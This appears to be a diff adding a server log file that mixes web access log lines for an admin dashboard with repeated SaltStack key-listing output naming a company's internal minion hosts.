+[23/May/2016 14:59:30] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:59:30] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:59:30] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:59:30] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:59:30] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /index/ HTTP/1.1" 200 9341
+[23/May/2016 15:00:32] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 15:00:32] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /index/ HTTP/1.1" 200 9341
+[23/May/2016 15:01:25] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 15:01:25] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 15:03:04] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 15:03:05] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 15:03:05] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 15:03:05] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 15:03:05] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 15:03:05] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 15:03:05] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 15:03:05] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+- img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_nod[23/May/2016 15:03:19] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 15:03:19] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 15:03:19] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 15:03:19] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 15:03:19] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 15:03:19] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 15:03:19] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 15:03:19] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
